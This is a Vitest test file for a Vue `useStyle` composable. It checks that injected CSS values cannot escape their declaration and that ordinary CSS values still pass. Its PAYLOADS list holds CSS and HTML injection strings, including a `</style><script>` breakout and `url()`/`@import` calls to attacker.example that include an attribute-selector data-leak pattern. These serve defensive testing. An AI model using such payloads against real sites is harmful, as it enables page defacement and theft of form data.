// #1113 — `useStyle` must never let a style VALUE escape its declaration.
//
// Reads the TEXT of the `<style>` `useStyle()` injects in `<head>`, and the
// rules jsdom parsed out of it — never `getComputedStyle`, blind to `var()`
// under jsdom (CLAUDE.md, #398).

import { computed, defineComponent, h, type StyleValue } from 'vue'
import { mount } from '@vue/test-utils'
import { describe, expect, it } from 'vitest'

import { useStyle } from '@origam/composables/Commons/style.composable'

function injectedSheet (bag: StyleValue) {
    let tagId = ''
    const Host = defineComponent({
        name: 'OrigamStyleInjectionHost',
        setup () {
            const { styleTagId } = useStyle(computed(() => bag), 'host')
            tagId = styleTagId
            return () => h('div', { id: 'host' })
        }
    })
    const wrapper = mount(Host, { attachTo: document.body })
    const el = document.getElementById(tagId) as HTMLStyleElement
    const text = el.textContent ?? ''
    const rules = el.sheet ? Array.from(el.sheet.cssRules).map((r) => r.cssText) : []
    wrapper.unmount()
    return { text, rules }
}

const PAYLOADS = [
    'red; } body { display:none } .x {',
    'red;} body{background:url(https://attacker.example/x)}',
    'red</style><script>alert(1)</script>',
    'red; @import url(https://attacker.example/x.css)',
    'red /* } body { display:none } */',
    'red\\7d body{display:none}',
    'red\n} body { display:none }',
    'url(x)} input[value^=a]{background:url(https://attacker.example/a)',
    'red "; } body { display:none } .x {',
    'expression(alert(1))'
]

describe('useStyle — injection (#1113)', () => {
    it.each(PAYLOADS)('an object value cannot escape its declaration: %s', (payload) => {
        const { text, rules } = injectedSheet({ color: payload, padding: '4px' })

        expect(rules).toHaveLength(1)
        expect(text).not.toContain('body')
        expect(text).not.toContain('attacker')
        expect(text).not.toContain('<')
        expect(text).not.toContain('expression(')
        // the legitimate sibling declaration survives
        expect(text).toContain('padding: 4px')
    })

    it.each(PAYLOADS)('a string declaration cannot escape the rule: %s', (payload) => {
        const { text, rules } = injectedSheet(`color: ${payload}`)

        expect(rules).toHaveLength(1)
        expect(text).not.toContain('body')
        expect(text).not.toContain('attacker')
        expect(text).not.toContain('<')
    })

    it('an injected property NAME is refused too', () => {
        const { text, rules } = injectedSheet({ ['color:red} body{display:none} .x{color']: 'red' })

        expect(rules).toHaveLength(1)
        expect(text).not.toContain('body')
    })
})

describe('useStyle — legitimate values still pass (#1113)', () => {
    const LEGIT: Array<[string, string]> = [
        ['width', '12px'],
        ['width', '50%'],
        ['height', '100vh'],
        ['margin', '0 auto'],
        ['z-index', '2000'],
        ['--origam-btn---background-color', 'var(--origam-color__primary---bg, #6d28d9)'],
        ['width', 'calc(100% - var(--origam-space---md, 16px))'],
        ['background-color', 'color-mix(in srgb, var(--origam-color__primary---bg) 12%, transparent)'],
        ['color', 'rgb(255 0 128 / 0.5)'],
        ['color', 'rgba(255, 0, 128, 0.5)'],
        ['color', 'oklch(70% 0.1 200)'],
        ['color', '#ff0080'],
        ['font-size', 'clamp(1rem, 2.5vw, 2rem)'],
        ['font-family', '"Inter", sans-serif'],
        ['aspect-ratio', '16 / 9'],
        ['transform', 'translate3d(0, -50%, 0) rotate(45deg)'],
        ['grid-template-columns', 'repeat(auto-fill, minmax(120px, 1fr))'],
        ['box-shadow', '4px 4px 0 #171717, inset 0 1px 0 rgba(255,255,255,.2)'],
        ['transition', 'opacity 0.2s cubic-bezier(0.4, 0, 0.2, 1)'],
        ['background-image', 'linear-gradient(90deg, red, blue)'],
        // a url() confined to its declaration is what an inline `style`
        // attribute allows too — consumers pass hero images through `style`
        ['background-image', 'url(/hero.jpg)'],
        ['background-image', 'url("data:image/svg+xml,%3Csvg%3E")'],
        ['background', 'url(data:image/png;base64,iVBORw0KGgo=) repeat'],
        ['font-family', '"A;B}{", serif'],
        ['content', '"\\2192"'],
        ['color', 'red !important']
    ]

    it.each(LEGIT)('%s: %s', (prop, value) => {
        const { text, rules } = injectedSheet({ [prop]: value })

        expect(text).toBe(`#host {${prop}: ${value}}`)
        expect(rules).toHaveLength(1)
    })

    it('camelCase keys are still kebab-cased', () => {
        expect(injectedSheet({ zIndex: '3' } as StyleValue).text).toBe('#host {z-index: 3}')
    })

    it('a legitimate multi-declaration string passes whole', () => {
        expect(injectedSheet('color: red; padding: calc(1px + 2px)').text)
            .toBe('#host {color: red;padding: calc(1px + 2px)}')
    })
})
